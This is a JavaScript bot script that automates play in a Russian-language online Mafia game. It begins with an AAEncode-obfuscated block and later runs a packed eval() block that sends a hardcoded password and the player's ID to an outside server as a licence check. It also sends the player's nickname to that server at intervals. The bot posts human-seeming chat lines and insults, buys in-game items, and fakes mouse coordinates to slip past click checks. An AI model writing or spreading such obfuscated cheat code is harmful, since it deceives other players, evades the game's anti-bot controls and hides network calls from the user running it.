(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');
    

_WND_proc('clans');
$($('#rootContainer').children()[0]).remove();

setTimeout(function(){
	var my_soklan = $('#clu_'+my_clan+'_tbl').find('tr').find('td').find('a');
	for(var i=0;i<my_soklan.length;i++){
			blacklist[blacklist.length] = $($(my_soklan)[i]).text();
	}
	del_element_from_basket(blacklist,my_nick);
	$('.popup-close').click()
},300);
$.ajax({
  type: "POST",
  url: "http://vh17197.hv4.ru/bot/soklany.php",
  async: false,
  data: {"mynick": $('.my_nickname').text(), "list": '1'},
  success: function(data){
  arr_sokl = data;
  }
});

setInterval(function(){
	if ((rrole() != 'Гражданин!') && (vremya_sutok() == 'НОЧЬ') && (kol_sutok() != 1)){
		if (rrole() == 'Мафиози!'){
			za_naparom();
		}
	}
	if (vremya_sutok() == '') {
		if ((mode == 1) && (flag_cr == false)){
			create_room();
			flag_cr = true;
		}
		if (mode == 2){
			vhod_v_room();
		}
		if (mode == 3){
			var r = Math.floor((Math.random() * 2) + 1);
			if ((r==1) && (flag_cr == false)){
				create_room();
				flag_cr = true;
			}
			if (r==2){
				vhod_v_room();
			}
		}
		if (auk == true){
			zakup_auk();
		}
	}	
	if (vremya_sutok() != '') {
		exits();
		$('#k6').text(adresat);
		erase();
		ddead();
		prig_opr($($($('.popupGameVote').find('.nick'))[0]).text());
		$(".scrollButton").click(); 
		
		if ((rrole() == 'Комиссар!') || (rrole() == 'Сержант!')){
			var prova_k = $('#cco_log').find('.important-msg');
			var pr_k = $($(prova_k)[prova_k.length-1]).text();
			if (pprov != pr_k){
				pprov = pr_k;
				var aa = pr_k.indexOf(", что ")+6;
				var bbb = pr_k.indexOf(" - ");
				var rol_proverennogo = pr_k.substr(bbb+3,pr_k.length-bbb)+'!';
				var id_proverennogo = id_po_nicku(pr_k.substr(aa,bbb-aa));		
				if (rol_lss(rol_proverennogo) == 1){
					setTimeout(function(){
						mmessage(id_proverennogo,pr_k);
					},5000);
				}
			}
		}
	}
	if ((category_role() == 1) && (vremya_sutok() == 'ДЕНЬ')){
		baskets_1_and_4();
		write_proverennim();
	}	
	if ((category_role() == 0) && (rrole() != 'Маньяк!') && (vremya_sutok() == 'ДЕНЬ')){
		baskets_1_for_maf();
		sliv_za_naparom();
	}	
	if (vremya_sutok() == 'ДЕНЬ') {
		if (category_role() == 1){
			sliv_za_proverennimi();
		}
		sliv_3_and_4_basket();
		if ((category_role() == 0) && (eextra == true)){
			var razn = parseInt($('#whl_t1').text()) - parseInt($('#whl_t0').text());
			if (razn == 1){
				$('.x2vote').click();
			}		
		}
	}
	if (((vremya_sutok() == 'ДЕНЬ') || (vremya_sutok() == 'НОЧЬ')) && (_flag == false)){	
		setTimeout(function(){
			flag = true;
		},25000);
		_flag = true;
	}	
	if (flag == true){
		baskets_2_and_3();	
		if (((category_role() == 0) || (rrole() == 'Комиссар!') || (rrole() == 'Сержант!')) && (rrole() != 'Маньяк!')){
			poisk_naparov();
		}	
		flag = false;
	}
	if ((vremya_sutok() == 'НОЧЬ') && (kol_sutok() == 1)){
		obnulenie();
	}
	if ((bolt == true) && (vremya_sutok() == 'ДЕНЬ') && (kol_sutok() == 1)){
		if (flag_priv == false){
			if (rrole() == 'Нефритовый заяц!'){
				var privet = ['я заяц', 'заяц я', 'Я нефрит', 'заяц я, кому подарки?', 'Я ЗАЯЦ КОМУ ДАРИТЬ?', 'ура я заяц', 'я заяц, меня не бить', 'меня не бейте, буду подарки дарить', 'всем ку, я заяц', 'я нефрит', 'я зайка', 'заяц я'];		
			}
			if (rrole() == 'Добрый зайка!'){
				var privet = ['я заяц', 'заяц я', 'Я добрый', 'заяц я, кому подарки?', 'Я ЗАЯЦ КОМУ ДАРИТЬ?', 'ура я заяц', 'я заяц, меня не бить', 'меня не бейте, буду подарки дарить', 'всем ку, я заяц', 'я добрый', 'я зайка', 'заяц я'];	
			}
			if (rrole() == 'Вредный зайка!'){
				var privet = ['я заяц', 'заяц я', 'Я вредный', 'заяц я, кому подарки?', 'Я ЗАЯЦ КОМУ ДАРИТЬ?', 'ура я заяц', 'я заяц, меня не бить', 'меня не бейте, буду подарки дарить', 'всем ку, я заяц', 'я вредный', 'я зайка', 'заяц я'];	
			}
			if (rrole() == 'Дед Мороз!'){
				var privet = ['я дед', 'дед я', 'Я ДЕД', 'дед я, кому подарки?', 'Я ДЕД КОМУ ДАРИТЬ?', 'ура я дед', 'я дед, меня не бить', 'меня не бейте, буду подарки дарить', 'всем ку, я дед', 'я Дед мороз', 'я дедушка', 'дедушка я'];		
			}
			if (rrole() == 'Влюблённый!'){
				var privet = ['я влюб', 'влюб я, активы отпишитесь', 'Я ВЛЮБ', 'влюб я, кому подарки?', 'Я ВЛЮБ КОМУ ДАРИТЬ?', 'ура я влюб, активы отпишитесь', 'я влюб, меня не бить', 'меня не бейте, буду подарки дарить', 'всем ку, я влюб', 'я влюб, активы отпишитесь', 'я влюбленный', 'влюб я'];		
			}
			if (rrole() == 'Кондитер!'){
				var privet = ['я конд', 'конд я', 'Я КОНД', 'конд я, кому подарки?', 'Я КОНД КОМУ ДАРИТЬ?', 'ура я конд', 'я конд, меня не бить', 'меня не бейте, буду подарки дарить', 'всем ку, я конд', 'я кондитер', 'я конд, активы отпишитесь', 'конд я, активы отпишитесь'];		
			}
            /*if (rrole().indexOf("зайка")){
				var privet = ['я зая', 'зая я', 'Я ЗАЯ', 'зая я, кому подарки?', 'Я ЗАЯ КОМУ ДАРИТЬ?', 'ура я зая', 'я зая, меня не бить', 'меня не бейте, буду подарки дарить', 'всем ку, я зая', 'я зайчик', 'я конд, активы отпишитесь', 'зая я, активы отпишитесь'];		
			}*/
			else{
				var privet = ['прив всем', 'хай', 'гр', 'опять гр', 'гырю', 'привет', 'всем привет', 'ку', 'всем ку', 'привет всем', 'мир', 'мирный'];		
			}
			_CHT_action('', 'smile', privet[Math.floor(Math.random() * 10) + 1], event);
			setTimeout(function (){
				_CHT_action('ich', 'send', 'close', event);
			}, 1000);
			if (my_clan == '6125'){ 
				fish();
			}		
			flag_priv = true;
			if (rrole() == 'Маньяк!'){
				baskets_3_for_man();
			}		
		}
	}	

	if ((rrole() != 'Гражданин!') && (vremya_sutok() == 'ДЕНЬ') && (flag1 == false)){
		setTimeout(function(){
			flag2 = true;
		},20000);
		flag1 = true;
	}
	if ((rrole() != 'Гражданин!') && (vremya_sutok() == 'НОЧЬ') && (kol_sutok() != 1)){
		var nik = $('#upl_list').find('li').find('.nick');
		var rran = 0;
		if (rrole() == 'Мафиози!'){
			za_naparom();
		}

		if ((search_po_nicku(adresat) == 0) || (adresat == null) || (adresat == '') || (search_element_from_basket(basket_5,adresat) != -1)){
			adresat = basket_3[Math.floor((Math.random() * basket_3.length) + 1)-1];
			if ((adresat == null) || (adresat == '')){
				adresat = basket_2[Math.floor((Math.random() * basket_2.length) + 1)-1];
				if ((adresat == null) || (adresat == '')){
					adresat = basket_1[Math.floor((Math.random() * basket_1.length) + 1)-1];
					if ((adresat == null) || (adresat == '')){
						adresat = basket_4[Math.floor((Math.random() * basket_4.length) + 1)-1];
					}
				}
			}
		}
		
		if ((rrole() == 'Комиссар!') || (rrole() == 'Сержант!')){
				for(var i=0; i<6; i++){
					if (search_element_from_basket(basket_6,adresat) != -1){
						if (basket_3.length > 0){	
							var r = Math.floor((Math.random() * basket_3.length) + 1);
							if (basket_3[r-1] != null){ adresat = basket_3[r-1];}	
						}
						else {
							var r = Math.floor((Math.random() * basket_2.length) + 1);
							if (basket_2[r-1] != null){ adresat = basket_2[r-1];}					
						}
					}
				}			
		}		

		if ((kol_sutok() == 2) && (adresat == sozd_game) && (rand_liga > 3)){
			for(var i=0; i<6; i++){
				if (adresat == sozd_game){
					var r = Math.floor((Math.random() * basket_3.length) + 1);
					adresat = basket_3[r-1];
				}
			}
		}
		
		for(var i=0;i<nik.length;i++){
			if ($($(nik)[i]).text()==adresat){
				$($('#upl_list').find('button')[i]).click();
				if (search_element_from_basket(basket_5,adresat) != -1){
					rran = 1;
				}
			}
		}

		if (rran == 1){
			cut(basket_3[Math.floor((Math.random() * basket_3.length) + 1)-1]);
		}
		flag1 = false;
	}	
	
	if (flag2 == true){
		adresat = '';
		move_to_adr();
		flag2 = false;
	}
	
	//Перевод во 2 корзину отписавшихся в лс
	if (category_role() == 1){
		lichka();
	}
	
	if ((category_role() == 0) && (rrole() != 'Маньяк!')){
		poisk_naparov();
	}

	if ((bolt == true) && (ks != kol_sutok()) && (vremya_sutok() == 'ДЕНЬ') && (hod_rol != 'Доктор')){
		var no_hod_m = $('#cco_log').find('.night-msg');
		var no_hod = $($(no_hod_m)[no_hod_m.length-1]).text();
		if ((no_hod.indexOf('Не ходили') + 1) && (no_hod.indexOf('Доктор') + 1) && (hod_count == 0)){
			var hod_slova = ['док нуб', 'нубодок', 'ппц док', 'где док??', 'док ходи', 'ой нуб док', 'нубодок', 'док олень', 'док ты где?', 'док спит', 'док блин', 'ну ппц док'];
			_CHT_action('', 'smile', hod_slova[Math.floor(Math.random() * 10) + 1], event);
			setTimeout(function (){
				_CHT_action('ich', 'send', 'close', event);
			}, 1000);
			hod_count = 1;
			hod_rol = 'Доктор';
		}	
		if ((no_hod.indexOf('Не ходили') + 1) && (no_hod.indexOf('Комиссар') + 1) && (hod_count == 0) && (hod_rol != 'Комиссар')){
			var hod_slova = ['ком нуб', 'нубоком', 'ппц ком', 'где ком??', 'ком ходи', 'ой нуб ком', 'как щас без кома', 'ком рак', 'ком ты где?', 'ком спит', 'ком блин', 'ну ппц ком'];
			_CHT_action('', 'smile', hod_slova[Math.floor(Math.random() * 10) + 1], event);
			setTimeout(function (){
				_CHT_action('ich', 'send', 'close', event);
			}, 1000);
			hod_count = 1;
			hod_rol = 'Комиссар';
		}
		if ((no_hod.indexOf('Не ходили') + 1) && (no_hod.indexOf('Свидетель') + 1) && (hod_count == 0) && (hod_rol != 'Свидетель')){
			var hod_slova = ['свид нуб', 'свид ты где', 'ппц свид', 'где свид??', 'свид ходи', 'ой нуб свид', 'свииид', 'свид лось', 'свид ты где?', 'свид спит', 'свид блин', 'ну ппц свид'];
			_CHT_action('', 'smile', hod_slova[Math.floor(Math.random() * 10) + 1], event);
			setTimeout(function (){
				_CHT_action('ich', 'send', 'close', event);
			}, 1000);
			hod_count = 1;
			hod_rol = 'Свидетель';
		}
		if ((no_hod.indexOf('Не ходили') + 1) && (no_hod.indexOf('Вор') + 1) && (hod_count == 0) && (hod_rol != 'Вор')){
			var hod_slova = ['вор нуб', 'вор ты где', 'ппц вор', 'где вор??', 'вор ходи', 'ой нуб вор', 'вор пля ходи', 'вор лосось', 'вор ты где?', 'вор спит', 'вор блин', 'ну ппц вор'];
			_CHT_action('', 'smile', hod_slova[Math.floor(Math.random() * 10) + 1], event);
			setTimeout(function (){
				_CHT_action('ich', 'send', 'close', event);
			}, 1000);
			hod_count = 1;
			hod_rol = 'Вор';
		}
		if ((no_hod.indexOf('Не ходили') + 1) && (no_hod.indexOf('Стерва') + 1) && (hod_count == 0) && (hod_rol != 'Стерва')){
			var hod_slova = ['стерва нубка', 'стерва ты где', 'ппц стерва', 'стерва вор??', 'стерва ходи', 'ой нубка стерва', 'стерва пля ходи', 'стерва тупая', 'стерва ты где?', 'стерва спит', 'стерва блин', 'ну ппц стерва'];
			_CHT_action('', 'smile', hod_slova[Math.floor(Math.random() * 10) + 1], event);
			setTimeout(function (){
				_CHT_action('ich', 'send', 'close', event);
			}, 1000);
			hod_count = 1;
			hod_rol = 'Стерва';
		}
		if ((no_hod.indexOf('Не ходили') + 1) && (no_hod.indexOf('Мафиози') + 1) && (hod_count == 0) && (hod_rol != 'Мафиози')){
			var hod_slova = ['збс маф спит', 'ура маф не ходит', 'маф спит (c)', '(c) спит маф', 'маф спи', 'ура спит маф', 'спящий маф (c)', 'маф дрыхни', 'супер маф спит', 'мафло спит (c)', 'пусть не ходит маф (c)', 'не ходил маф збс (c)'];
			_CHT_action('', 'smile', hod_slova[Math.floor(Math.random() * 10) + 1], event);
			setTimeout(function (){
				_CHT_action('ich', 'send', 'close', event);
			}, 1000);
			hod_count = 1;
			hod_rol = 'Мафиози';
		}
		if ((no_hod.indexOf('Не ходили') + 1) && (no_hod.indexOf('Босс мафии') + 1) && (hod_count == 0) && (hod_rol != 'Босс мафии')){
			var hod_slova = ['босс (c)', 'босс (c)', 'спи босс (c)', '(c) спит босс', 'босс спи', 'ура спит босс', 'спящий босс (c)', 'босс дрыхни', 'супер босс спит', 'босс спит (c)', 'пусть не ходит босс (c)', 'не ходил босс збс (c)'];
			_CHT_action('', 'smile', hod_slova[Math.floor(Math.random() * 10) + 1], event);
			setTimeout(function (){
				_CHT_action('ich', 'send', 'close', event);
			}, 1000);
			hod_count = 1;
			hod_rol = 'Босс мафии';
		}
		if ((no_hod.indexOf('Не ходили') + 1) && (no_hod.indexOf('Двуликий') + 1) && (hod_count == 0) && (hod_rol != 'Двуликий')){
			var hod_slova = ['двул (c)', 'двуля (c)', 'спи двул (c)', '(c) спит двул', 'двул спи', 'ура спит двул', 'спящий двул (c)', 'двул дрыхни', 'супер двул спит', 'двул спит (c)', 'пусть не ходит двул (c)', 'не ходил двул збс (c)'];
			_CHT_action('', 'smile', hod_slova[Math.floor(Math.random() * 10) + 1], event);
			setTimeout(function (){
				_CHT_action('ich', 'send', 'close', event);
			}, 1000);
			hod_count = 1;
			hod_rol = 'Двуликий';
		}
		ks = kol_sutok();
		hod_count = 0;
	}
    $(".z_ghost").remove()
    $(".reanim").remove()
    $(".egg").click();	
}, 4000);
setInterval(function (){
//прокачка акков
   if(my_level==5){
    smena();
   }
   /*if(my_play_c<=30){
    smena();
   }*/
	flag_cr = false;
	$.ajax({
		type: "POST",
		url: "http://vh17197.hv4.ru/bot/soklany.php",
		async: false,
		data: {"mynick": $('.my_nickname').text(), "list": '1'},
		success: function(data){
			arr_sokl = data;
		}
	});

    arr_sokl.replace("");
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('e 0="f";$.b({a:\'c://d.9.8/4/3.5\',6:\'7\',2:{\'0\':0,\'g\':p,},o:\'q\',r:s(2){n(2!=1){i("h j k");l.m()}}});',29,29,'pwd||data|testProverki|bot|php|type|POST|ru|hv4|url|ajax|http|vh17197|var|develop|id|go|alert|to|nahuy|location|reload|if|dataType|my_id|json|success|function'.split('|'),0,{}))
	var slova = [':)', ':{', ':]', '8-)', ':|', '}:', '=0', 'x)', '.', ':)', ':)', '8-)'];
	if ((bolt == true) && ((vremya_sutok() == 'ДЕНЬ') || (vremya_sutok() == 'НОЧЬ')))
	{
		_CHT_action('', 'smile', slova[Math.floor(Math.random() * 10) + 1], event);
	}
	setTimeout(function ()
	{
		_CHT_action('ich', 'send', 'close', event);
	}, 1000)
	
	if ((rrole() != 'Гражданин!') && (eextra == true) && (vremya_sutok() != '') && (parseInt($('.moneyBalance').text()) > 1000)){
		if ((category_role() == 0) && ($("li").is("#gxt_109") == false)){
			_WND_proc('extras', 'buy', {id: 109}, event); //тачка
		}
		if ($("li").is("#gxt_111") == false){
			_WND_proc('extras', 'buy', {id: 111}, event); //миноискатель
		}
		if (((rrole() == 'Двуликий!') || (rrole() == 'Маньяк!'))&& ($("li").is("#gxt_108") == false)){
			_WND_proc('extras', 'buy', {id: 108}, event); //паспорт
		}
		if (((rrole() == 'Купидон!') || (rrole() == 'Кондитер!') || (rrole() == 'Влюблённый!') || (rrole() == 'Маньяк!') || (rrole() == 'Комиссар!')||(rrole().indexOf("зайка"))) && ($("li").is("#gxt_106") == false)){
			_WND_proc('extras', 'buy', {id: 106}, event); //маска
			var slova_msk = ['МАСКИ', 'маски', 'маски не рвите', 'маски, гр', 'маски, тачки', 'МАСКИ Я ГР', 'гр, маски', 'тачки, маски', 'не трогайте маски', 'не рвать маски, я гр', 'маски не трогать!', 'МАСКИ!'];
			if ((bolt == true) && ((vremya_sutok() == 'ДЕНЬ') || (vremya_sutok() == 'НОЧЬ'))){
				_CHT_action('', 'smile', slova_msk[Math.floor(Math.random() * 10) + 1], event);
			}
			setTimeout(function (){
				_CHT_action('ich', 'send', 'close', event);
			}, 1000)
		}
		if ($("li").is("#gxt_161") == false){
			_WND_proc('extras', 'buy', {id: 161}, event); //перчи
		}
		if ((category_role() == 0) && ($("li").is("#gxt_103") == false)){
			_WND_proc('extras', 'buy', {id: 103}, event); //удвойка
		}
	}	
}, 90000);
}
//модификация сбора яиц
function _EGG(oo, evt){
if(location.href.indexOf("standalone")+1){ 
	hash= PAGE_goto.toString().substr(82,32); 
	} 
	if(location.href.indexOf("odnoklassniki")+1){ 
	hash= PAGE_goto.toString().substr(85,32); 
	} 
	if(location.href.indexOf("vkontakte")+1){ 
	hash= PAGE_goto.toString().substr(81,32); 
	} 
	if(location.href.indexOf("moymir")+1){ 
	hash= PAGE_goto.toString().substr(78,32); 
	} 
	var _evt = (!evt ? window.event : evt);
    var rand = 500 + Math.random()*(800+1-500); 
_evt.clientX = rand^0;
	if ($(oo).length && typeof _evt.clientX != "undefined"){
		var _l = parseInt($(oo).attr("label"));
		if (!_l){
			$.ajax({
				async: true,
				cache: false,
				type: "POST",
				url: "/standalone/"+hash+"/DO/" + Math.random(),
				data: {method: "egg_click", cx: _evt.clientX},
				dataType: "json",
				success: function(data) {
					if (typeof data.ret != "undefined"){
						var _eret = parseInt(data.ret);
						if (_eret == 10 || _eret == 11) _eret += '_'+ my_gender;
						
						$(oo).attr("label", (data.ret == 6 ? 0 : 1));
						$(oo).find(".itemImg").css("background", "url(/images/events/easter/eggs/"+ _eret +".png) no-repeat 0 0");
						$(oo).addClass("showAnim");
						
						if (data.ret == 6){
							setTimeout(function(){
								$(oo).fadeOut(150, function(){$(this).remove()});
							}, 10000);
						}

						if (!_SOUND_err) _SOUND_arr['sfx']['item_click'].play();
						if (typeof __hxda['eas11'] != "undefined") _HX_hint('eas12');
					}else{
						$(oo).remove();
					}
				}
			});
		}else{
			$(oo).find(".anim").fadeOut(150, function(){					
				$(oo).animate({top: 0, left: 0}, 250, function() {$(this).remove();});  
			});
		}
	}
}
//$('#myExtras').append('<div style="color:white;font-weight:bold;">Ночной ход:<span id="k6"></span></div>');